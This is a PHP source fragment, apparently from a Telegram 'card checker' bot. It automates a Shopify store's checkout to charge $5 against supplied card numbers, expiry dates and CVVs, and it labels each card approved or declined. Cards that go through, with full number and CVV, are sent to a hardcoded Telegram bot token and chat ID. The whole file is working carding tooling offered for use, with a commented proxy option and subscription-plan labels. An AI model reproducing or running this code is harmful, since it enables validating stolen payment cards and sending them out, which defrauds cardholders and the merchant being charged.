$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://corporate-traditions.myshopify.com';
$headers[] = 'DNT: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'Sec-Fetch-Dest: document';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'Sec-Fetch-User: ?1';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.$auth1.'&previous_step=contact_information&step=payment_method&checkout%5Bemail%5D='.urlencode($email).'&checkout%5Bbilling_address%5D%5Bfirst_name%5D=&checkout%5Bbilling_address%5D%5Blast_name%5D=&checkout%5Bbilling_address%5D%5Bcompany%5D=&checkout%5Bbilling_address%5D%5Baddress1%5D=&checkout%5Bbilling_address%5D%5Baddress2%5D=&checkout%5Bbilling_address%5D%5Bcity%5D=&checkout%5Bbilling_address%5D%5Bcountry%5D=&checkout%5Bbilling_address%5D%5Bprovince%5D=&checkout%5Bbilling_address%5D%5Bzip%5D=&checkout%5Bbilling_address%5D%5Bphone%5D=&checkout%5Bbilling_address%5D%5Bfirst_name%5D='.$name.'&checkout%5Bbilling_address%5D%5Blast_name%5D='.$last.'&checkout%5Bbilling_address%5D%5Bcompany%5D='.$name.'&checkout%5Bbilling_address%5D%5Baddress1%5D='.urlencode($city).'&checkout%5Bbilling_address%5D%5Baddress2%5D=23&checkout%5Bbilling_address%5D%5Bcity%5D='.urlencode($city).'&checkout%5Bbilling_address%5D%5Bcountry%5D=United+States&checkout%5Bbilling_address%5D%5Bprovince%5D='.$statee.'&checkout%5Bbilling_address%5D%5Bzip%5D='.$zip.'&checkout%5Bbilling_address%5D%5Bphone%5D=%28856%29+'.rand(111, 999).'-'.rand(1111, 9999).'&checkout%5Bremember_me%5D=&checkout%5Bremember_me%5D=0&checkout%5Bclient_details%5D%5Bbrowser_width%5D=1212&checkout%5Bclient_details%5D%5Bbrowser_height%5D=739&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=-330');
$curl = curl_exec($ch);
curl_close($ch);

# ------------------------------------------------------------------------- [5 Req] ------------------------------------------------------------------------ #

$ch = curl_init();
// curl_setopt($ch, CURLOPT_PROXY, "hub-us-7.litport.net:31337");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$user_pass");
curl_setopt($ch, CURLOPT_URL, 'https://corporate-traditions.myshopify.com/'.$id0.'/checkouts/'.$id1.'?previous_step=contact_information&step=payment_method');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'Host: corporate-traditions.myshopify.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'Referer: https://corporate-traditions.myshopify.com/';
$headers[] = 'DNT: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'Sec-Fetch-Dest: document';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'Sec-Fetch-User: ?1';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$curl = curl_exec($ch);
curl_close($ch);
$auth2 = getData($curl, 'input type="hidden" name="authenticity_token" value="','"');
$gate = getData($curl, 'data-select-gateway="','"');

# ------------------------------------------------------------------------- [6 Req] ------------------------------------------------------------------------ #

$ch = curl_init();
// curl_setopt($ch, CURLOPT_PROXY, "hub-us-7.litport.net:31337");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$user_pass");
curl_setopt($ch, CURLOPT_URL, 'https://deposit.us.shopifycs.com/sessions');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: deposit.us.shopifycs.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0';
$headers[] = 'Accept: application/json';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'Referer: https://checkout.shopifycs.com/';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Origin: https://checkout.shopifycs.com';
$headers[] = 'DNT: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-site';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"credit_card":{"number":"'.$cc1.' '.$cc2.' '.$cc3.' '.$cc4.'","name":"'.$name.' '.$last.'","month":'.$sub_mes.',"year":'.$ano.',"verification_value":"'.$cvv.'"},"payment_session_scope":"corporate-traditions.myshopify.com"}');
$curl = curl_exec($ch);
curl_close($ch);
$id = json_decode($curl, 1)['id'];
sleep(3);
# ------------------------------------------------------------------------- [7 Req] ------------------------------------------------------------------------ #

$ch = curl_init();
// curl_setopt($ch, CURLOPT_PROXY, "hub-us-7.litport.net:31337");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$user_pass");
curl_setopt($ch, CURLOPT_URL, 'https://corporate-traditions.myshopify.com/'.$id0.'/checkouts/'.$id1.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: corporate-traditions.myshopify.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'Referer: https://corporate-traditions.myshopify.com/';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://corporate-traditions.myshopify.com';
$headers[] = 'DNT: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'Sec-Fetch-Dest: document';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'Sec-Fetch-User: ?1';
$headers[] = 'TE: trailers';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.$auth2.'&previous_step=payment_method&step=&s='.$id.'&checkout%5Bpayment_gateway%5D='.$gate.'&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Btotal_price%5D=500&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=1212&checkout%5Bclient_details%5D%5Bbrowser_height%5D=739&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=-330');
$curl = curl_exec($ch);
curl_close($ch);
sleep(3);
# ------------------------------------------------------------------------- [8 Req] ------------------------------------------------------------------------ #

$ch = curl_init();
// curl_setopt($ch, CURLOPT_PROXY, "hub-us-7.litport.net:31337");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$user_pass");
curl_setopt($ch, CURLOPT_URL, 'https://corporate-traditions.myshopify.com/'.$id0.'/checkouts/'.$id1.'/processing');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'Host: corporate-traditions.myshopify.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'Referer: https://corporate-traditions.myshopify.com/';
$headers[] = 'DNT: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'Sec-Fetch-Dest: document';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'Sec-Fetch-User: ?1';
$headers[] = 'TE: trailers';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$curl = curl_exec($ch);
curl_close($ch);
sleep(4);
# ------------------------------------------------------------------------- [9 Req] ------------------------------------------------------------------------ #

$ch = curl_init();
// curl_setopt($ch, CURLOPT_PROXY, "hub-us-7.litport.net:31337");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$user_pass");
curl_setopt($ch, CURLOPT_URL, 'https://corporate-traditions.myshopify.com/'.$id0.'/checkouts/'.$id1.'/processing?from_processing_page=1');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'Host: corporate-traditions.myshopify.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'DNT: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'Sec-Fetch-Dest: document';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'TE: trailers';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$curl = curl_exec($ch);
curl_close($ch);
sleep(4);
# ------------------------------------------------------------------------ [10 Req] ------------------------------------------------------------------------ #

$ch = curl_init();
// curl_setopt($ch, CURLOPT_PROXY, "hub-us-7.litport.net:31337");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$user_pass");
curl_setopt($ch, CURLOPT_URL, 'https://corporate-traditions.myshopify.com/'.$id0.'/checkouts/'.$id1.'?from_processing_page=1&validate=true');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'Host: corporate-traditions.myshopify.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'DNT: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'Sec-Fetch-Dest: document';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'TE: trailers';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$result = curl_exec($ch);
curl_close($ch);
unlink("cookie.txt");
$message = getData($result, 'class="notice__content"><p class="notice__text">','</p>');


        $msg = getData($curl,'<div id="divError" class="BBFormErrorBlock"><div class="BBFormErrorItem BBFormServerErrorItem">','</div>');
        $content = ['chat_id' => $chat_id, 'text' => "<b>𝑪𝒂𝒓𝒅: <code>$cc|$mes|$ano|$cvv</code> ■■■■■ </b>", 'message_id' => $m3i, 'parse_mode' => 'html'];
        $m4  = EditMessageText($content);
        $m4i = $m4['result']['message_id'];

        if (strpos($result, 'Thank_you')) {
            $cc_code = 'Approved ✅';
            $message = "Charged 5$ ✅";
            $full = "SHOPIFY\nCC == <code>$cc|$mes|$ano|$cvv</code>\nRES = $cc_code\nREZPONSE- $message";
            $url = "https://api.telegram.org/bot5579015618:AAEnGaXH73gQ0wn7kjrdsskESUr8FmRgGSw/sendMessage?chat_id=-1001722364754&text=".$full."&parse_mode=HTML";
             
            file_get_contents($url);
        } elseif (strpos($result, 'Security code was not matched by the processor')) {
            $cc_code = 'Approved ✅';
            $full = "SHOPIFY\nCC == <code>$cc|$mes|$ano|$cvv</code>\nRES = $cc_code\nREZPONSE- $message";
            $url = "https://api.telegram.org/bot5579015618:AAEnGaXH73gQ0wn7kjrdsskESUr8FmRgGSw/sendMessage?chat_id=-1001722364754&text=".$full."&parse_mode=HTML";
             
            file_get_contents($url);
        } elseif(strpos($result,"Your order is confirmed")){
            $cc_code = "Approved ✅";
            $message = "Charged 5$ ✅";
            $full = "SHOPIFY\nCC == <code>$cc|$mes|$ano|$cvv</code>\nRES = $cc_code\nREZPONSE- $message";
            $url = "https://api.telegram.org/bot5579015618:AAEnGaXH73gQ0wn7kjrdsskESUr8FmRgGSw/sendMessage?chat_id=-1001722364754&text=".$full."&parse_mode=HTML";
             
            file_get_contents($url);
        }else{
            $cc_code = 'Declined ❌';
        }
        if (empty($result)) {
            $content = ['chat_id' => $chat_id, 'text' => "<b>┏━━━━━━━━━━━━━━\n┣ 🍁 𝑺𝒉𝒐𝒑𝒊𝒇𝒚 🍁\n┗━━━━━━━━━━━━━━\n══════════════════════\n[ϟ] 𝑮𝑨𝑻𝑬 : <code>𝑺𝒉𝒐𝒑𝒊𝒇𝒚 𝑪𝒉𝒂𝒓𝒈𝒆</code>\n[ϟ] 𝑪𝒂𝒓𝒅 : <code>$cc|$mes|$ano|$cvv</code>\n[ϟ] 𝑹𝒆𝒔𝒖𝒍𝒕 : <code>Unknown error $message</code>\n_𝑩𝒚: @$username [$plan]\n══════════════════════</b>", 'message_id' => $m4i, 'parse_mode' => 'html'];
            $m3  = EditMessageText($content);
            exit();
        }
        // $bank = $data['data']['bank'];
        // $country = $data['data']['country'];
        // $brand = $data['data']['vendor'];
        // $level = $data['data']['level'];
        // $type = $data['data']['type'];
        // $flag = $data['data']['countryInfo']['emoji'];
        $content = ['chat_id' => $chat_id, 'text' => "<b>┏━━━━━━━━━━━━━━\n┣ 🍁 𝑺𝒉𝒐𝒑𝒊𝒇𝒚 🍁\n┗━━━━━━━━━━━━━━\n══════════════════════\n[ϟ] 𝑮𝑨𝑻𝑬 : <code>𝑺𝒉𝒐𝒑𝒊𝒇𝒚 𝑪𝒉𝒂𝒓𝒈𝒆</code>\n[ϟ] 𝑪𝒂𝒓𝒅 : <code>$cc|$mes|$ano|$cvv</code>\n[ϟ] 𝑹𝒆𝒔𝒖𝒍𝒕 : <code>$cc_code</code>\n[ϟ] 𝑹𝒆𝒔𝒑𝒐𝒏𝒔𝒆 : <b>$message</b>\n┏━━━━━━━━━━━━━━\n┣ 🍁 𝑩𝑰𝑵 𝑫𝑨𝑻𝑨 🍁\n┗━━━━━━━━━━━━━━\n[ϟ] 𝑩𝒊𝒏 𝑫𝒆𝒕𝒂𝒊𝒍𝒔: $bin - $type - $brand - $level\n[ϟ] 𝑩𝒂𝒏𝒌: $bank\n[ϟ] 𝑪𝒐𝒖𝒏𝒕𝒓𝒚: $country - $flag\n[ϟ] 𝑪𝒉𝒆𝒄𝒌𝒆𝒅 𝑩𝒚: @$username [$plan]\n[ϟ] 𝑩𝒐𝒕 𝑩𝒚 : <code>@BossNetworkk</code>\n══════════════════════</b>", 'message_id' => $m4i, 'parse_mode' => 'html'];
        $m3  = EditMessageText($content);
    }
}
